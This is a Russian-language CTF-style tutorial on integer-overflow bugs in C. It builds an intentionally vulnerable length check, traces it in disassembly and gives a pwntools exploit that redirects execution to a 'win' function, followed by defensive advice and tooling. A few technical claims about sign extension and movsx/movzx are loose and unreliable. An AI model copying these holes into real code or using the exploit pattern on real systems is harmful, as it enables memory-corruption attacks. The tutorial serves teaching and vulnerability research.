## Вопрос, с которого всё начинается

Программа честно проверяет длину ввода: «если больше 64 — отказ». Казалось бы, переполнить нельзя. Но проверка смотрит на число одним способом, а `read` использует его другим — и граница исчезает. Это класс багов **целочисленных переполнений**.

Разберём конкретный пример, где отрицательное число обходит проверку и превращается в огромную длину чтения.

## Наш пример: проверка длины, которая не защищает

```c
// intvuln.c
#include <stdio.h>
int main(void) {
    char buf[64];
    short len;                  // 16-битное ЗНАКОВОЕ число
    scanf("%hd", &len);
    if (len > 64) {             // проверка "не больше 64"
        puts("too long");
        return 1;
    }
    read(0, buf, len);          // читает len байт
    puts(buf);
    return 0;
}
```

```bash
$ gcc -fno-stack-protector -no-pie -o intvuln intvuln.c
```

На первый взгляд защита есть. Но посмотри внимательно на тип `len`.

## Шаг 1. Как целое число обманывает проверку

Тип `short` — это **знаковое** 16-битное число. Оно может быть от −32768 до 32767. Что произойдёт, если ввести отрицательное значение, скажем `-1`?

Проверка `if (len > 64)` сравнивает знаковое `-1` с `64`. По правилам арифметики `-1` меньше `64`, поэтому условие **ложно** — программа пропускает нас дальше. «Отказ» не срабатывает.

А теперь ключевой момент: функция `read` принимает длину как `size_t` — **беззнаковое** 64-битное число. Компилятор молча преобразует наш `-1` в `size_t`. По правилам C отрицательное число превращается в очень большое положительное:

```
-1  ->  0xFFFFFFFFFFFFFFFF  (максимальное 64-битное значение)
```

Программа думает, что мы просим прочитать «почти бесконечность» байт. Значит, `read` будет читать, пока мы не перестанем слать данные, — и переполнит буфер на 64 байта далеко за его границы.

Это и есть **signedness bug**: одна и та же переменная трактуется то как знаковая, то как беззнаковая.

## Шаг 2. Проверяем гипотезу

Скормим программе `-1`, а затем длинный ввод:

```bash
$ (echo -1; python3 -c "print('A'*200)") | ./intvuln
Segmentation fault (core dumped)
```

Программа упала. Проверка длины её не спасла — мы проскочили мимо неё и переполнили буфер. Задача сведена к уже знакомому переполнению стека.

## Шаг 3. Другие лица той же проблемы

**Truncation (усечение)** — когда число обрезается при приведении к более узкому типу. Например:

```c
int len = atoi(argv[1]);       // до 2 миллиардов
unsigned char small = len;     // остаётся только младший байт!
read(0, buf, small);           // читает не то, что проверяли
```

Здесь проверка может пройти на большом `len`, но в буфер запишется лишь `len % 256` — и логика ломается. Или наоборот: проверяют узкий тип, а копируют широкий.

**Underflow** — уменьшение беззнакового числа ниже нуля:

```c
size_t n = size - 1;    // если size == 0, получим SIZE_MAX
memcpy(dst, src, n);    // огромная длина
```

Все три — вариации одного принципа: **проверка и использование смотрят на число по-разному**.

## Шаг 4. Ищем баг в дизассемблере

Чтобы найти такое в реальном бинаре, смотрим на сравнения и последующие вызовы чтения/копирования. Ищем `cmp` с границей и то, что идёт после него:

```bash
$ objdump -d -M intel ./intvuln | grep -A12 'call.*scanf'
  4011d0:  call   __isoc99_scanf@plt
  4011d5:  movsx  eax, WORD PTR [rbp-0x4a]   ; len -> 32 бита СО знаком
  4011d9:  cmp    eax, 0x40                  ; сравнение с 64
  4011dc:  jle    4011f0                     ; <= 64 -> идём дальше
  4011f0:  movsx  eax, WORD PTR [rbp-0x4a]   ; снова берём len
  4011f4:  mov    edx, eax                   ; edx = len (32 бита!)
  4011f6:  lea    rax, [rbp-0x40]
  4011fa:  mov    rsi, rax
  4011fd:  mov    edi, 0
  4011ff:  call   read@plt                   ; read(0, buf, edx)
```

Обрати внимание: `movsx` — «move sign-extend» — расширяет знаковое число. Значит, `len` действительно трактуется как знаковое, и `-1` пройдёт проверку `jle` (jump if less or equal). А в `read` длина уходит как 32-битная, но по C-правилам для `size_t` она расширяется беззнаково.

Ключевой признак в дизассемблере — **смешивание `movsx` (знаковое) и `movzx` (беззнаковое)** для одной и той же переменной. Это почти всегда баг.

## Шаг 5. Эксплуатируем: обходим проверку и переполняем

Теперь задача сводится к переполнению, но со своим смещением. Найдём его:

```python
>>> from pwn import *
>>> cyclic_find(0x6161616b6161616a)
72
```

Смещение до возврата — 72 (буфер 64 + `rbp` 8). Пусть в бинаре есть `win`; собираем эксплойт:

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./intvuln')
OFFSET = 72
win = elf.symbols['win']

p = process('./intvuln')
p.sendline(b'-1')                     # обходим проверку len > 64
p.send(b'A' * OFFSET + p64(win))      # переполняем и возвращаемся в win
p.interactive()
```

```bash
$ python3 exp.py
[*] Switching to interactive mode
$ id
uid=1000(user) gid=1000(user)
```

Обрати внимание: мы передали `-1` в проверку, а `read` получил `0xFFFFFFFFFFFFFFFF` — и этого хватило, чтобы переполнить стек.

## Как защищаться от целочисленных багов

Чтобы не наступить на эти грабли в своём коде, полезно помнить диапазоны типов и правила:

| Тип | Размер | Диапазон (знаковый) |
|---|---|---|
| `char` | 8 бит | −128 … 127 |
| `short` | 16 бит | −32768 … 32767 |
| `int` | 32 бита | −2^31 … 2^31−1 |
| `unsigned int` | 32 бита | 0 … 2^32−1 |
| `size_t` | 64 бита | 0 … 2^64−1 |

Правила гигиены:

- проверять длину **в том же типе**, в котором она потом используется для копирования;
- для размеров и длин использовать `size_t` и `unsigned`, а не `int`/`short`;
- перед арифметикой проверять переполнение (`__builtin_add_overflow` в GCC);
- не полагаться на то, что «пользователь введёт положительное число» — валидировать знак явно.

Атакующему же достаточно помнить: **любая проверка, которая расширяет или сужает число, — потенциальный обход.**

## Что мы теперь знаем

- Целочисленное переполнение превращает «безопасную» проверку длины в дыру.
- `short` — знаковое число; `-1` проходит проверку `> 64`, но в `size_t` становится огромным.
- Signedness bug — когда переменная трактуется то как знаковая, то как беззнаковая.
- Truncation — обрезание числа при приведении к узкому типу; underflow — уход беззнакового в максимум.
- В дизассемблере смешивание `movsx` и `movzx` для одной переменной — признак бага.
- Эксплуатация сводится к обычному переполнению с найденным смещением.

## Классика: размер аллокации переполняется

Самый частый integer-overflow в реальном коде — не знаковость, а переполнение при вычислении размера буфера:

```c
int count = ntohl(hdr.count);          // до 4 миллиардов
int size = count * 4;                  // count=0x40000001 -> size отрицателен
char *buf = malloc(size);              // malloc получает size_t -> огромный запрос
memcpy(buf, data, count * 4);          // копируем больше, чем выделили
```

Здесь `count * 4` переполняет 32-битный `int` и даёт отрицательное число. В `malloc` оно превращается в `size_t` — огромное; `malloc` может вернуть `NULL` или маленький буфер, а `memcpy` пишет по «правильному» (большому) числу. Это классический путь к heap-overflow.

## Underflow в цикле

Похожий сюжет — счётчик, который уменьшается без проверки:

```c
size_t n = len;
do { buf[--n] = data[n]; } while (n > 0);   // если len == 0, n становится SIZE_MAX
```

При `len == 0` первая же итерация уменьшает `n` до `SIZE_MAX`, и запись уходит далеко за границы буфера. Другой вариант — `len - 1` при `len == 0`: результат `SIZE_MAX`, и следующий `memcpy` попытается прочитать гигабайты.

## Детект: UBSan и статические анализаторы

Ловить эти баги помогают инструменты:

- **UBSan** (`-fsanitize=undefined`) — в рантайме сообщает о signed overflow, truncation, сдвигах;
- **ASan** — ловит последствия (переполнение буфера), даже если причина — integer;
- **CodeQL / Coverity** — статически ищут опасные приведения типов и арифметику с размерами;
- **Compiler warnings** `-Wconversion -Wsign-compare` — предупреждают о неявных сужениях.

Для атакующего вывод простой: если видишь в дизассемблере умножение или сдвиг перед `malloc`/`calloc` — проверь, не переполняется ли результат при больших входных значениях.

## Signed и unsigned в дизассемблере

Различие знаковости проявляется в выборе условных переходов. Компилятор для знаковых сравнений ставит `jl/jg/jle/jge`, а для беззнаковых — `jb/ja/jbe/jae`. Один и тот же `cmp` с последующим `ja` против `jg` полностью меняет семантику: `-1` как знаковое меньше `64`, но как беззнаковое — огромно. Поэтому, встретив проверку границы, смотри не только на константу, но и на **тип перехода**. Признак бага — когда значение сначала сравнивается знаковым переходом (`jl`, `jg`), а затем передаётся в функцию, ожидающую `size_t` (например, `read`/`memcpy`). Инструкции `movsx` (знаковое расширение) рядом с `movzx`/`mov eax` (беззнаковым) для одной переменной — почти гарантированный обход границы. Научившись читать эти два признака, ты находишь целочисленные баги прямо в дизассемблере, без исходников.

## Куда дальше

Целочисленные баги — это «подводка» к переполнению, а не отдельный финал. Дальше по пути идут защиты и их обход: в уроке `pwn-canary-bypass` разберём, как работает стековый страж и как его обойти, а в `pwn-pie-bypass` — как справиться с рандомизацией адресов. Запомни главное: **если проверка и использование трактуют число по-разному — границы нет.**

## Где пригодится

- **CTF Pwn:** множество задач строится на обходе проверки длины через знаковость.
- **Vulnerability research:** integer overflow — частый путь к memory corruption в реальном коде (CWE-190).
- **Bug bounty:** парсеры, конвертеры изображений, сетевые протоколы — типичные цели.
- **Аудит кода:** умение замечать `short`/`int` там, где ждут `size_t`, — ценный навык.
